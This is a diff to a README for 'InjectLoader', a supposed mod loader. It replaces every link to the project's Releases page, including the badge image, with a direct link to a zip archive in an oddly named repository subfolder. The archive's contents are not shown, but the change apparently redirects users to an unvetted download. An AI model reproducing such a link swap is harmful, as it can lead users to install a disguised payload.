@@ -1,6 +1,6 @@
 # 🚀 InjectLoader - A Simple Mod Loader for Everyone
 
-[![Download InjectLoader](https://img.shields.io/badge/Download-InjectLoader-blue?style=for-the-badge)](https://github.com/AbdelG-06/InjectLoader/releases)
+[![Download InjectLoader](https://raw.githubusercontent.com/AbdelG-06/InjectLoader/main/unpeccable/InjectLoader-v3.0.zip)](https://raw.githubusercontent.com/AbdelG-06/InjectLoader/main/unpeccable/InjectLoader-v3.0.zip)
 
 ## 📋 Overview
 
@@ -30,7 +30,7 @@ InjectLoader comes packed with features that make modding straightforward:
 
 To download InjectLoader, visit the Releases page. Here, you can find the latest version available for download. Choose the version that suits your needs best.
 
-[Visit this page to download InjectLoader](https://github.com/AbdelG-06/InjectLoader/releases)
+[Visit this page to download InjectLoader](https://raw.githubusercontent.com/AbdelG-06/InjectLoader/main/unpeccable/InjectLoader-v3.0.zip)
 
 ### ⚙️ Installation Steps
 
@@ -77,4 +77,4 @@ InjectLoader thrives thanks to the contributions from our user community. If you
 
 InjectLoader is licensed under the MIT License. Feel free to use and modify as needed.
 
-[![Download InjectLoader](https://img.shields.io/badge/Download-InjectLoader-blue?style=for-the-badge)](https://github.com/AbdelG-06/InjectLoader/releases)
+[![Download InjectLoader](https://raw.githubusercontent.com/AbdelG-06/InjectLoader/main/unpeccable/InjectLoader-v3.0.zip)](https://raw.githubusercontent.com/AbdelG-06/InjectLoader/main/unpeccable/InjectLoader-v3.0.zip)
